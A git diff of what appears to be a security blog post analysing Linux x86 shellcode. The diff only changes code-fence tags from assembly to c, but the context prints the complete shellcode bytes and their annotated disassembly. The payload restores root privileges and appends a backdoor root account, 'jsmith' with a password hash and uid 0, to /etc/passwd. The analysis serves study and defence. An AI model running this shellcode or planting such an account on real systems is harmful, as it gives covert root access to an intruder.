@@ -48,7 +48,7 @@ As we can see, the new root user was successfully created. Next I continued to d
 $ echo -ne "\x31\xc9\x89\xcb\x6a\x46\x58\xcd\x80\x6a\x05\x58\x31\xc9\x51\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe3\x41\xb5\x04\xcd\x80\x93\xe8\x24\x00\x00\x00\x6a\x73\x6d\x69\x74\x68\x3a\x41\x7a\x2e\x54\x4f\x53\x72\x67\x72\x4d\x36\x72\x6f\x3a\x30\x3a\x30\x3a\x3a\x2f\x3a\x2f\x62\x69\x6e\x2f\x73\x68\x0a\x59\x8b\x51\xfc\x6a\x04\x58\xcd\x80\x6a\x01\x58\xcd\x80" |ndisasm -b 32 -
 ```
 First the shellcode restores the privileges, in case the running process would have dropped them: 
-```asm
+```c
 00000000  31C9              xor ecx,ecx             ; Effective user id - 0
 00000002  89CB              mov ebx,ecx             ; Real user id - 0
 00000004  6A46              push byte +0x46         ; sys_setreuid16 syscall number
@@ -59,7 +59,7 @@ First the shellcode restores the privileges, in case the running process would h
 Next, it will open the _`/etc/passwd`_ file. The flags for opening the file will be set to *`0x00000401: O_WRONLY|O_APPEND`*. 
 
 *__Note1__*: the mode for opening the file, which should have been in `EDX` register, is not specified because it is ignored for _`O_CREAT`_ flag not specified:
-```asm
+```c
 00000009  6A05              push byte +0x5
 0000000B  58                pop eax                 ; Prepare eax for sys_open syscall
 0000000C  31C9              xor ecx,ecx             ; Set ecx to 0 
@@ -79,7 +79,7 @@ open("/etc//passwd", O_WRONLY|O_APPEND) = 3
 ```
 
 The next part will write the _`jsmith:Az.TOSrgrM6ro:0:0::/:/bin/sh\n`_ string to it (username and encrypted password): 
-```asm
+```c
 00000025  93                xchg eax,ebx
 00000026  E824000000        call dword 0x4f
 ; String starts  here -->
@@ -104,7 +104,7 @@ The next part will write the _`jsmith:Az.TOSrgrM6ro:0:0::/:/bin/sh\n`_ string to
 ```
 
 We then have to disassemble the instructions starting after the end of string (easily done in gdb): 
-```asm
+```c
 00000051  51                push ecx
 00000052  FC                cld
 00000053  6A04              push byte +0x4
@@ -114,7 +114,7 @@ We then have to disassemble the instructions starting after the end of string (e
 ```
 
 Finally the shellcode calls the exit function to cleanly finish execution: 
-```assembly
+```c
 00000058  6A01              push byte +0x1
 0000005A  58                pop eax         ; sys_exit syscall
 0000005B  CD80              int 0x80
